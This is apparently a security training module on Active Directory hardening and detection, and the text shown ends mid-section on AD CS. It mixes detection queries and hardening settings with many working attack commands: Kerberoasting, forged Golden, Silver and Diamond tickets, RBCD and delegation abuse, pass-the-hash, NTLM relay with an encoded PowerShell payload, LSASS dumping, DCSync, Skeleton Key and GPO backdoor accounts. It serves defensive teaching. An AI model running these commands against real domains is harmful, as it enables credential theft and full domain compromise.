# Active Directory Security Hardening and Attack Detection

> **Modulo 27** · **Tempo:** 480 min · **Aggiornamento:** 2026-05-07

## Idee guida

1. **Active Directory is the crown jewel.** Compromise AD = compromise everything.
2. **Assume breach, detect fast, contain faster.** Prevention fails eventually; detection must not.
3. **Tiered administration is non-negotiable.** Tier 0 credentials never touch Tier 1/2 systems.
4. **Every misconfiguration is an attack path.** BloodHound sees what admins ignore.
5. **Defense without detection is blind.** Log everything, alert on the right signals.

---

## Indice

1. [Architettura Active Directory e Superficie d'Attacco](#1-architettura-active-directory-e-superficie-dattacco)
2. [Attacchi Kerberos](#2-attacchi-kerberos)
3. [Credential Attacks](#3-credential-attacks)
4. [Privilege Escalation in AD](#4-privilege-escalation-in-ad)
5. [Lateral Movement](#5-lateral-movement)
6. [Hardening Active Directory](#6-hardening-active-directory)
7. [Monitoraggio e Detection](#7-monitoraggio-e-detection)
8. [AD Certificate Services Security](#8-ad-certificate-services-security)
9. [Azure AD / Entra ID Security](#9-azure-ad--entra-id-security)
10. [Laboratorio Pratico](#10-laboratorio-pratico)
11. [Enterprise Access Model — Evoluzione dal Modello a Livelli](#11-enterprise-access-model--evoluzione-dal-modello-a-livelli)
12. [Hardening Kerberos Avanzato — AES, FAST Armoring, e Deprecazione RC4](#12-hardening-kerberos-avanzato--aes-fast-armoring-e-deprecazione-rc4)
13. [ADCS Security Avanzata — ESC9 fino a ESC14](#13-adcs-security-avanzata--esc9-fino-a-esc14)
14. [Attacchi di Coercion e Difesa Completa](#14-attacchi-di-coercion-e-difesa-completa)
15. [Protezione DPAPI e Backup Chiavi di Dominio](#15-protezione-dpapi-e-backup-chiavi-di-dominio)
16. [Protezione dei Domain Controller contro Ransomware](#16-protezione-dei-domain-controller-contro-ransomware)
17. [Strumenti di Security Assessment Avanzati](#17-strumenti-di-security-assessment-avanzati)
18. [Regole di Detection SIEM Avanzate](#18-regole-di-detection-siem-avanzate)
19. [Hardening AdminSDHolder e Prevenzione Persistenza AD](#19-hardening-adminsdholder-e-prevenzione-persistenza-ad)
20. [Checklist Operativa di Sicurezza AD — 2025-2026](#20-checklist-operativa-di-sicurezza-ad--2025-2026)

---

## 1. Architettura Active Directory e Superficie d'Attacco

### 1.1 AD DS Core Architecture

Active Directory Domain Services (AD DS) is a distributed, hierarchical database that stores identity objects (users, computers, groups, OUs) and provides authentication/authorization services for Windows environments. Understanding the architecture at protocol level is prerequisite to understanding the attack surface.

**Logical Structure Hierarchy:**

```
Forest (security boundary — trust is transitive within)
├── Domain (replication boundary, policy boundary)
│   ├── Organizational Unit (OU — delegation boundary)
│   │   ├── Users
│   │   ├── Computers
│   │   └── Groups
│   └── Domain Controllers
├── Domain (child or tree)
└── Trust Relationships (inter-forest, external, shortcut)
```

The forest is the ultimate security boundary in AD — not the domain. A domain admin in a child domain can escalate to Enterprise Admin via the SID History attack or krbtgt trust key extraction. This architectural reality means that any domain compromise within a forest effectively compromises the entire forest.

**Physical Structure:**

- **Sites**: Represent physical network topology; control replication flow and client authentication targeting.
- **Domain Controllers (DCs)**: Host the NTDS.DIT database, run KDC (Key Distribution Center), DNS, and replication services.
- **Replication Topology**: DCs replicate via RPC over IP (intra-site) and SMTP (inter-site for schema/configuration only). The Knowledge Consistency Checker (KCC) auto-generates the replication topology.
- **Global Catalog (GC)**: Partial read-only replica of all objects in the forest. Contains a subset of attributes for every object. Port 3268 (LDAP) / 3269 (LDAPS). Critical for Universal Group membership resolution and cross-domain queries.

### 1.2 Protocolli di Autenticazione come Superficie d'Attacco

#### LDAP (Lightweight Directory Access Protocol)

LDAP is the query and modification interface to AD. Default ports: 389 (cleartext), 636 (LDAPS/TLS), 3268/3269 (GC).

**Attack surface:**
- LDAP null bind or anonymous bind — enumeration without credentials
- LDAP injection in web applications integrated with AD
- Cleartext LDAP (port 389 without STARTTLS) — credential sniffing
- LDAP relay attacks when signing is not enforced

```powershell
# Check if LDAP signing is required (hardened)
Get-ADObject -SearchBase "CN=Directory Service,CN=Windows NT,CN=Services,$(
    (Get-ADRootDSE).configurationNamingContext
)" -Filter * -Properties "msDS-Other-Settings" |
    Select-Object -ExpandProperty "msDS-Other-Settings"

# Query domain policy for LDAP signing requirements
(Get-ADObject -SearchBase ((Get-ADRootDSE).defaultNamingContext) `
    -LDAPFilter "(objectClass=domainDNS)" `
    -Properties "ms-DS-MachineAccountQuota").{ms-DS-MachineAccountQuota}
```

#### Kerberos

Kerberos is the default authentication protocol in AD environments (Windows 2000+). It operates on a ticket-based model using symmetric key cryptography.

**Authentication Flow:**

```
1. AS-REQ: Client → KDC (DC)
   - Sends username + encrypted timestamp (pre-auth) using user's key (derived from password hash)
   
2. AS-REP: KDC → Client
   - Returns TGT (Ticket Granting Ticket) encrypted with krbtgt hash
   - Returns session key encrypted with user's key
   
3. TGS-REQ: Client → KDC
   - Sends TGT + requests access to specific service (SPN)
   
4. TGS-REP: KDC → Client
   - Returns TGS (service ticket) encrypted with target service account's key
   
5. AP-REQ: Client → Service
   - Presents TGS to target service
```

**Attack surface per step:**
- Step 1: AS-REP Roasting (if pre-auth disabled)
- Step 2: Credential cracking (offline brute force of TGT)
- Step 3: Kerberoasting (request TGS for any SPN, crack offline)
- Step 4: Silver Ticket (forge TGS with service account hash)
- Step 2+: Golden Ticket (forge TGT with krbtgt hash)
- Delegation: S4U2Self/S4U2Proxy abuse

#### NTLM (NT LAN Manager)

Legacy challenge-response protocol still present in most environments. Falls back when Kerberos fails (IP-based access, cross-forest without proper DNS, legacy apps).

**NTLM Authentication Flow:**

```
1. NEGOTIATE: Client → Server (announces NTLM)
2. CHALLENGE: Server → Client (sends 8-byte nonce)
3. AUTHENTICATE: Client → Server (sends response computed from nonce + NT hash)
```

**Attack surface:**
- Pass-the-Hash: NT hash is functionally equivalent to the password for NTLM auth
- NTLM Relay: Forward authentication to another service
- NTLM downgrade: Force Kerberos failure to get NTLM
- NTLMv1 cracking: Weak algorithm, can crack to NT hash from network capture

### 1.3 FSMO Roles come Target Critici

Five FSMO (Flexible Single Master Operations) roles exist per forest/domain:

| Role | Scope | Impact if Compromised |
|------|-------|----------------------|
| Schema Master | Forest | Modify AD schema — add backdoor attributes |
| Domain Naming Master | Forest | Add rogue domains to forest |
| PDC Emulator | Domain | Password changes, time sync, GPO authority |
| RID Master | Domain | Allocate RIDs — create objects with known SIDs |
| Infrastructure Master | Domain | Cross-domain reference updates |

The PDC Emulator is the highest-value target per domain: it receives urgent password changes, is the authoritative time source (Kerberos depends on time sync within 5 minutes), and is the default GPO target.

### 1.4 Trust Relationships e Attacchi Cross-Domain

**Trust types:**
- **Parent-child**: Automatic, two-way transitive within a forest
- **Tree-root**: Automatic between tree roots in the same forest
- **External**: One-way or two-way, non-transitive, between domains in different forests
- **Forest**: One-way or two-way, transitive, between forests (requires forest functional level 2003+)
- **Shortcut**: Optimization trust within a forest

**Attack implications:**
- Intra-forest trusts share the same krbtgt inter-realm key — Golden Ticket with SID History can escalate from child to forest root
- External/forest trusts use trust keys stored in TDO (Trusted Domain Object) — extractable via DCSync
- SID Filtering (quarantine) is the defense against SID History abuse across forest boundaries, but is disabled by default for intra-forest trusts

```powershell
# Enumerate all trusts in the domain
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType,
    IntraForest, SIDFilteringQuarantined, SIDFilteringForestAware

# Check trust attributes (bit flags)
Get-ADObject -Filter {ObjectClass -eq "trustedDomain"} -Properties * |
    Select-Object Name, trustDirection, trustType, trustAttributes,
    securityIdentifier
```

### 1.5 Replication Topology come Vettore d'Attacco

AD replication uses MS-DRSR (Directory Replication Service Remote Protocol) over RPC. The `GetNCChanges` operation is what DCSync abuses — any principal with `Replicating Directory Changes` and `Replicating Directory Changes All` rights can request replication of any object's secrets.

By default, only Domain Controllers, Domain Admins, Enterprise Admins, and the domain's Administrators group hold these rights. However, misconfigurations (backup software, Exchange, legacy migrations) frequently grant these rights to additional principals.

```powershell
# Identify who has DCSync rights
Import-Module ActiveDirectory
$domainDN = (Get-ADDomain).DistinguishedName
$acl = Get-Acl "AD:\$domainDN"
$acl.Access | Where-Object {
    ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2") -or  # Replicating Directory Changes
    ($_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2") -or  # Replicating Directory Changes All
    ($_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c")       # Replicating Directory Changes in Filtered Set
} | Select-Object IdentityReference, ActiveDirectoryRights, ObjectType
```

---

## 2. Attacchi Kerberos

### 2.1 Kerberoasting — Teoria e Pratica

Kerberoasting exploits the fact that any authenticated domain user can request a TGS (service ticket) for any service registered with an SPN (Service Principal Name). The TGS is encrypted with the service account's NT hash (derived from password). The attacker extracts the ticket and performs offline brute-force/dictionary attack — no lockout policy applies.

**Why it works:**
- Any domain user can request TGS for any SPN (by design)
- TGS is encrypted with the service account's long-term key (RC4 = NT hash by default)
- No failed login events generated — it's a legitimate TGS request
- Service accounts often have weak passwords and no rotation policy
- Many service accounts have Domain Admin or equivalent privileges

**High-value targets:**
- MSSQL service accounts (often DA-equivalent)
- Exchange service accounts
- IIS application pool identities running as domain accounts
- Backup software service accounts (often have DCSync rights)

#### Tool: Rubeus (C#, in-memory)

```powershell
# Enumerate kerberoastable accounts
Rubeus.exe kerberoast /stats

# Request RC4 tickets (faster cracking)
Rubeus.exe kerberoast /tgtdeleg /rc4opsec

# Target specific high-value account
Rubeus.exe kerberoast /user:svc_mssql /format:hashcat /outfile:hashes.txt

# Request AES tickets (stealthier — matches normal traffic)
Rubeus.exe kerberoast /aes /user:svc_backup

# Use alternate credentials (from compromised account)
Rubeus.exe kerberoast /creduser:DOMAIN\compromised /credpassword:P@ss123
```

#### Tool: Impacket (Python, remote)

```bash
# Basic kerberoasting (outputs hashcat format)
impacket-GetUserSPNs DOMAIN.LOCAL/user:password -dc-ip 10.0.0.1 \
    -request -outputfile kerberoast_hashes.txt

# With NTLM hash (pass-the-hash)
impacket-GetUserSPNs DOMAIN.LOCAL/user -hashes :NTHASH -dc-ip 10.0.0.1 \
    -request

# Target specific user
impacket-GetUserSPNs DOMAIN.LOCAL/user:password -dc-ip 10.0.0.1 \
    -request-user svc_sql -outputfile sql_hash.txt
```

#### Cracking with Hashcat

```bash
# RC4 (mode 13100) — fast
hashcat -m 13100 kerberoast_hashes.txt /path/to/wordlist.txt \
    -r /path/to/rules/best64.rule

# AES-256 (mode 19700) — slower
hashcat -m 19700 aes_hashes.txt /path/to/wordlist.txt

# AES-128 (mode 19600)
hashcat -m 19600 aes128_hashes.txt /path/to/wordlist.txt
```

**Detection — Event ID 4769 (TGS request):**
- Look for: RC4 encryption (0x17) requested by a user account (not machine account)
- High volume of 4769 from single source
- TGS requests for SPNs not normally accessed by that user

```xml
<!-- Windows Event Log XPath query for Kerberoasting detection -->
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[(EventID=4769)]]
      and
      *[EventData[Data[@Name='TicketEncryptionType']='0x17']]
      and
      *[EventData[Data[@Name='ServiceName']!='krbtgt']]
      and
      *[EventData[Data[@Name='ServiceName']!='$*']]
    </Select>
  </Query>
</QueryList>
```

### 2.2 AS-REP Roasting

When Kerberos pre-authentication is disabled for an account (`DONT_REQUIRE_PREAUTH` flag), anyone can send an AS-REQ for that user and receive an AS-REP containing data encrypted with the user's key — crackable offline.

```powershell
# Find accounts with pre-auth disabled
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |
    Select-Object SamAccountName, DistinguishedName

# Rubeus AS-REP roasting
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Target specific user
Rubeus.exe asreproast /user:target_user /format:hashcat
```

```bash
# Impacket AS-REP roasting
impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile users.txt -dc-ip 10.0.0.1 \
    -format hashcat -outputfile asrep_hashes.txt

# With credentials (enumerate vulnerable accounts automatically)
impacket-GetNPUsers DOMAIN.LOCAL/user:password -dc-ip 10.0.0.1 \
    -request -format hashcat
```

```bash
# Crack AS-REP hashes (hashcat mode 18200)
hashcat -m 18200 asrep_hashes.txt /path/to/wordlist.txt -r rules/best64.rule
```

### 2.3 Golden Ticket

A Golden Ticket is a forged TGT signed with the krbtgt account's NT hash. Since the KDC validates TGTs by decrypting them with krbtgt's key, possessing this key grants the ability to forge tickets for any user (including non-existent ones) with any group membership (including Domain Admins, Enterprise Admins).

**Requirements:**
- krbtgt NT hash (obtained via DCSync, NTDS.DIT extraction, or domain controller compromise)
- Domain SID
- Domain name

**Persistence characteristics:**
- Valid for 10 years by default (TGT lifetime in the forged ticket)
- Survives password resets of all accounts except krbtgt
- krbtgt must be reset TWICE (current + previous key are both valid) with at least 12-24 hours between resets (to allow replication)

```powershell
# Forge Golden Ticket with Mimikatz
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
    /sid:S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX \
    /krbtgt:NTHASH_HERE /id:500 /groups:512,513,518,519,520 \
    /ptt

# With Rubeus (create and inject)
Rubeus.exe golden /aes256:AES256_KEY /user:Administrator \
    /domain:DOMAIN.LOCAL \
    /sid:S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX \
    /id:500 /pgid:513 /groups:512,518,519,520 /ptt
```

```bash
# Impacket ticketer
impacket-ticketer -nthash NTHASH_KRBTGT -domain-sid S-1-5-21-XXX \
    -domain DOMAIN.LOCAL Administrator

# Use the forged ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec DOMAIN.LOCAL/Administrator@dc01.domain.local -k -no-pass
```

### 2.4 Silver Ticket

A Silver Ticket is a forged TGS (service ticket) created with the service account's NT hash. Unlike Golden Tickets, Silver Tickets never touch the KDC — they are presented directly to the target service. This makes them stealthier but limited to a single service.

```powershell
# Forge Silver Ticket for CIFS (file shares) on a target server
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
    /sid:S-1-5-21-XXX /target:fileserver.domain.local \
    /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt

# Silver Ticket for LDAP on DC (enables DCSync without DA!)
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
    /sid:S-1-5-21-XXX /target:dc01.domain.local \
    /service:ldap /rc4:DC_MACHINE_ACCOUNT_HASH /ptt
```

### 2.5 Diamond Ticket

Diamond Tickets (introduced in Rubeus 2.2+) modify a legitimately requested TGT rather than forging one from scratch. The attacker decrypts a real TGT (using the krbtgt key), modifies the PAC (Privilege Attribute Certificate) to include elevated group memberships, re-encrypts, and uses it. This is significantly harder to detect than Golden Tickets because the ticket metadata (timestamps, flags) matches legitimate issuance patterns.

```powershell
# Diamond Ticket with Rubeus
Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:normaluser \
    /password:P@ss /enctype:aes /ticketuser:Administrator \
    /domain:DOMAIN.LOCAL /dc:dc01.domain.local /ticketuserid:500 \
    /groups:512 /ptt
```

### 2.6 Delegation Attacks

#### Unconstrained Delegation

When a computer or service account has unconstrained delegation enabled, any user's TGT is cached in memory on that system when they authenticate. An attacker who compromises an unconstrained delegation system can extract all cached TGTs.

```powershell
# Find unconstrained delegation systems
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation |
    Select-Object Name, DNSHostName

Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation |
    Select-Object SamAccountName

# Coerce DC authentication to unconstrained delegation system (Printer Bug)
SpoolSample.exe DC01.DOMAIN.LOCAL YOURSERVER.DOMAIN.LOCAL

# Extract TGT from memory with Rubeus
Rubeus.exe monitor /interval:5 /filteruser:DC01$
# When DC TGT arrives:
Rubeus.exe ptt /ticket:BASE64_TGT
```

#### Constrained Delegation (S4U2Self + S4U2Proxy)

Constrained delegation limits which services a delegating account can impersonate users to. However, if compromised, the attacker can impersonate ANY user to the allowed target services.

```powershell
# Find constrained delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo,
    SamAccountName | Select-Object SamAccountName, msDS-AllowedToDelegateTo

# Abuse with Rubeus — impersonate admin to allowed service
Rubeus.exe s4u /user:svc_constrained /rc4:HASH_HERE \
    /impersonateuser:Administrator \
    /msdsspn:cifs/targetserver.domain.local /ptt

# Alternative with Impacket
impacket-getST DOMAIN.LOCAL/svc_constrained -hashes :HASH \
    -spn cifs/targetserver.domain.local \
    -impersonate Administrator -dc-ip 10.0.0.1
```

#### Resource-Based Constrained Delegation (RBCD)

RBCD moves the delegation configuration to the target resource (via `msDS-AllowedToActOnBehalfOfOtherIdentity`). An attacker who can modify this attribute on a computer object (requires `WRITE` to the computer object) can configure any controlled account to delegate to that target.

```powershell
# Check who can write to target computer's msDS-AllowedToActOnBehalfOfOtherIdentity
# (typically: the account that joined the computer to the domain, CREATOR OWNER, etc.)

# Create a machine account (default: any user can create up to 10 — ms-DS-MachineAccountQuota)
New-MachineAccount -MachineAccount FAKEPC -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)

# Set RBCD on target
Set-ADComputer TARGET$ -PrincipalsAllowedToDelegateToAccount FAKEPC$

# Get ticket via S4U
Rubeus.exe s4u /user:FAKEPC$ /rc4:HASH_OF_FAKEPC /impersonateuser:Administrator \
    /msdsspn:cifs/TARGET.domain.local /ptt
```

```bash
# Full RBCD attack with Impacket
# 1. Create machine account
impacket-addcomputer DOMAIN.LOCAL/user:password -computer-name FAKEPC$ \
    -computer-pass 'Passw0rd!' -dc-ip 10.0.0.1

# 2. Configure RBCD
impacket-rbcd DOMAIN.LOCAL/user:password -delegate-from FAKEPC$ \
    -delegate-to TARGET$ -action write -dc-ip 10.0.0.1

# 3. Get impersonation ticket
impacket-getST DOMAIN.LOCAL/FAKEPC$:'Passw0rd!' \
    -spn cifs/TARGET.domain.local -impersonate Administrator -dc-ip 10.0.0.1

# 4. Use ticket
export KRB5CCNAME=Administrator@cifs_TARGET.domain.local@DOMAIN.LOCAL.ccache
impacket-psexec DOMAIN.LOCAL/Administrator@TARGET.domain.local -k -no-pass
```

---

## 3. Credential Attacks

### 3.1 Pass-the-Hash (PtH)

NTLM authentication uses the NT hash directly — the plaintext password is never needed. Any extracted NT hash can be used to authenticate as that user to any service accepting NTLM.

```bash
# Impacket PtH examples
impacket-psexec DOMAIN.LOCAL/Administrator@10.0.0.5 -hashes :NTHASH
impacket-wmiexec DOMAIN.LOCAL/Administrator@10.0.0.5 -hashes :NTHASH
impacket-smbexec DOMAIN.LOCAL/Administrator@10.0.0.5 -hashes :NTHASH
impacket-atexec DOMAIN.LOCAL/Administrator@10.0.0.5 -hashes :NTHASH "whoami"

# CrackMapExec (NetExec) for mass PtH
nxc smb 10.0.0.0/24 -u Administrator -H NTHASH --local-auth
nxc smb 10.0.0.0/24 -u Administrator -H NTHASH -d DOMAIN.LOCAL
```

```powershell
# Mimikatz PtH
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:HASH /run:cmd.exe
```

### 3.2 Pass-the-Ticket (PtT)

Use a stolen Kerberos ticket (TGT or TGS) to authenticate. No hash needed — just the ticket blob.

```powershell
# Export tickets from current session (Mimikatz)
sekurlsa::tickets /export

# Import a stolen ticket
kerberos::ptt ticket.kirbi

# Rubeus — harvest and use tickets
Rubeus.exe harvest /interval:30
Rubeus.exe ptt /ticket:BASE64_TICKET_OR_FILE
```

### 3.3 Overpass-the-Hash (Pass-the-Key)

Convert an NT hash into a Kerberos ticket, enabling Kerberos-only environments to be attacked with a hash.

```powershell
# Mimikatz overpass-the-hash
sekurlsa::pth /user:admin /domain:DOMAIN.LOCAL /ntlm:HASH /run:powershell.exe
# The spawned process will request Kerberos tickets using the hash

# Rubeus overpass-the-hash
Rubeus.exe asktgt /user:admin /domain:DOMAIN.LOCAL /rc4:HASH /ptt
Rubeus.exe asktgt /user:admin /domain:DOMAIN.LOCAL /aes256:AES_KEY /ptt /opsec
```

### 3.4 NTLM Relay — Complete Attack Chain

NTLM relay intercepts an authentication attempt and forwards it to a different target. The attacker doesn't crack the hash — they relay the live authentication session.

**Prerequisites:**
- SMB signing disabled on target (default for workstations, enabled on DCs)
- Target accepts NTLM authentication
- Victim initiates connection to attacker (via link file, Responder, coercion)

```bash
# Step 1: Identify targets without SMB signing
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# Step 2: Set up NTLM relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support \
    -c "powershell -enc BASE64_PAYLOAD"

# Step 2 (alternative): Relay to LDAP for RBCD attack
impacket-ntlmrelayx -t ldap://dc01.domain.local --delegate-access \
    --escalate-user FAKEPC$

# Step 2 (alternative): Relay to ADCS for certificate enrollment
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp \
    --adcs --template DomainController

# Step 3: Coerce authentication (Responder, PetitPotam, PrinterBug, etc.)
responder -I eth0 -wrf
# or
python3 PetitPotam.py ATTACKER_IP DC01.DOMAIN.LOCAL
```

### 3.5 LSASS Credential Extraction

LSASS (Local Security Authority Subsystem Service) holds cached credentials in memory: NT hashes, Kerberos tickets, plaintext passwords (if WDigest enabled or pre-Win8.1).

**Extraction techniques:**

```powershell
# Mimikatz (requires SeDebugPrivilege)
privilege::debug
sekurlsa::logonpasswords    # All cached credentials
sekurlsa::msv               # NT hashes only
sekurlsa::kerberos          # Kerberos tickets
sekurlsa::wdigest           # Plaintext if WDigest enabled

# Process dump methods (bypass AV signatures)
# comsvcs.dll MiniDump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# Task Manager → Details → lsass.exe → Create Dump File
# ProcDump (Sysinternals — signed binary, less likely to be blocked)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Nanodump (evasive — direct syscalls, unhooking)
nanodump.exe --write C:\temp\nano.dmp

# Parse offline dump with Mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**Protections against LSASS dumping:**
- Credential Guard (virtualization-based security — LSASS runs in isolated container)
- RunAsPPL (Protected Process Light) — blocks non-Microsoft-signed processes from opening LSASS
- ASR (Attack Surface Reduction) rules — block credential stealing from LSASS
- Disable WDigest authentication (registry: `UseLogonCredential = 0`)

```powershell
# Enable RunAsPPL via registry
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name "RunAsPPL" -Value 1 -Type DWord

# Disable WDigest
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    -Name "UseLogonCredential" -Value 0 -Type DWord

# Verify Credential Guard status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object VirtualizationBasedSecurityStatus,
    SecurityServicesRunning, SecurityServicesConfigured
```

### 3.6 DCSync Attack

DCSync abuses the replication protocol (MS-DRSR) to request password data from a DC — the attacker impersonates a DC requesting replication. Requires `Replicating Directory Changes` + `Replicating Directory Changes All` rights.

```powershell
# Mimikatz DCSync — single user
lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt

# DCSync — all users
lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv
```

```bash
# Impacket secretsdump — full DCSync
impacket-secretsdump DOMAIN.LOCAL/admin:password@dc01.domain.local
impacket-secretsdump DOMAIN.LOCAL/admin@dc01.domain.local -hashes :HASH

# Dump NTDS.DIT secrets remotely
impacket-secretsdump DOMAIN.LOCAL/admin:password@dc01.domain.local \
    -just-dc -just-dc-ntlm -outputfile domain_hashes
```

**Detection — Event ID 4662:**
```xml
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[(EventID=4662)]]
      and
      *[EventData[
        Data[@Name='Properties']='*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*'
        or
        Data[@Name='Properties']='*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*'
      ]]
      and
      *[EventData[Data[@Name='SubjectUserName']!='*$']]
    </Select>
  </Query>
</QueryList>
```

### 3.7 Skeleton Key

Skeleton Key is a persistence technique that patches the LSASS process on a DC to accept a master password for any account, in addition to the real password. The legitimate password still works — the skeleton key is an additional backdoor password.

```powershell
# Deploy Skeleton Key (Mimikatz on DC — requires DA)
privilege::debug
misc::skeleton
# Default skeleton key password: "mimikatz"
# Now authenticate as any user with password "mimikatz"
```

**Detection:**
- Event ID 7045 (new service installed) if deployed via service
- Monitor LSASS memory integrity
- Regular DC restarts clear it (memory-only patch)
- Defender for Identity detects the LSASS patch pattern

### 3.8 DCShadow

DCShadow registers a rogue Domain Controller in AD, pushes malicious changes via replication, then removes the rogue DC. Changes appear to come from legitimate DC replication — extremely difficult to detect with traditional logging.

```powershell
# DCShadow (requires DA-equivalent)
# Terminal 1 — Push mode (registers rogue DC, pushes changes)
lsadump::dcshadow /object:TargetUser /attribute:primaryGroupID /value:512

# Terminal 2 — Execute the push
lsadump::dcshadow /push
```

**Detection:**
- Monitor `nTDSDSA` object creation in `CN=Sites` (new DC registration)
- Event ID 4742 (computer account changed) — look for DCs being added
- Monitor DNS SRV records for new `_ldap._tcp` entries
- Network baseline — detect new replication connections between non-DC systems

---

## 4. Privilege Escalation in AD

### 4.1 ACL Abuse

Active Directory uses Discretionary Access Control Lists (DACLs) to control permissions on objects. Misconfigured ACLs create direct privilege escalation paths.

**Critical exploitable ACEs:**

| Permission | Impact |
|-----------|--------|
| GenericAll | Full control — reset password, modify group membership, write any attribute |
| GenericWrite | Write to any attribute — modify SPN (targeted kerberoasting), modify delegation |
| WriteDACL | Modify the ACL itself — grant yourself GenericAll |
| WriteOwner | Change object owner — then modify DACL |
| ForceChangePassword | Reset target's password without knowing current |
| AddMember | Add yourself to a group (including Domain Admins) |
| AllExtendedRights | Includes ForceChangePassword + read LAPS passwords |
| Self (Validated-SPN) | Write SPN to self (enable kerberoasting) |

**BloodHound Cypher queries for ACL abuse paths:**

```cypher
// Find shortest path from owned user to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

// Find users with GenericAll on other users
MATCH (u:User)-[r:GenericAll]->(t:User) RETURN u.name, t.name

// Find WriteDACL paths to Domain Admins group
MATCH p=(u:User)-[:WriteDacl]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN p

// Find all ACL-based attack paths from a specific user
MATCH p=shortestPath((u:User {name:"COMPROMISED@DOMAIN.LOCAL"})-
    [:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AddMember*1..]->(t))
WHERE t.highvalue = true
RETURN p
```

**Exploitation examples:**

```powershell
# WriteDACL abuse — grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity CurrentUser `
    -Rights All -Verbose

# ForceChangePassword
Set-DomainUserPassword -Identity TargetUser -AccountPassword `
    (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force) -Verbose

# AddMember to Domain Admins
Add-DomainGroupMember -Identity "Domain Admins" -Members "CompromisedUser" -Verbose

# GenericWrite — set SPN for targeted kerberoasting
Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='anything/whatever'}
# Now kerberoast the target
```

### 4.2 Group Policy Abuse

If an attacker can modify a GPO linked to a privileged OU (e.g., Domain Controllers OU), they can push arbitrary configuration or code execution.

```powershell
# Find GPOs and who can modify them
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite"} |
    Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# SharpGPOAbuse — add immediate scheduled task via GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" `
    --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" `
    --Arguments "/c net localgroup administrators compromised /add" `
    --GPOName "Default Domain Policy"

# pyGPOAbuse (Linux alternative)
python3 pygpoabuse.py DOMAIN.LOCAL/user:password \
    -gpo-id "6AC1786C-016F-11D2-945F-00C04fB984F9" \
    -command "cmd /c net user backdoor P@ss123! /add && net localgroup administrators backdoor /add" \
    -f
```

### 4.3 AD Certificate Services Abuse (AD CS) — ESC1 through ESC8

AD CS (Active Directory Certificate Services) misconfigurations are among the most impactful privilege escalation vectors in modern AD environments. Certified by SpecterOps documented 8 escalation techniques.

#### ESC1: Misconfigured Certificate Template — Enrollee Supplies Subject

The most common and dangerous: a template allows the enrollee to specify the Subject Alternative Name (SAN). An attacker can request a certificate for any user (including Domain Admin).

**Conditions:**
- Template allows enrollment by low-privileged users
- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set
- Template enables client authentication EKU
- Manager approval NOT required

```bash
# Enumerate vulnerable templates with Certipy
certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -vulnerable

# Exploit ESC1 — request cert as Domain Admin
certipy req -u user@domain.local -p password -ca DOMAIN-CA \
    -target ca.domain.local -template VulnerableTemplate \
    -upn administrator@domain.local

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# Returns NT hash of Administrator
```

#### ESC2: Misconfigured Template — Any Purpose EKU

Template has "Any Purpose" or "SubCA" EKU — can be used for client auth.

#### ESC3: Enrollment Agent Template Abuse

Template allows enrollment agent certificates. An enrollment agent can enroll on behalf of any other user.

#### ESC4: Vulnerable Template ACL

Low-privileged user has write access to a certificate template object. Modify it to create ESC1 conditions.

```bash
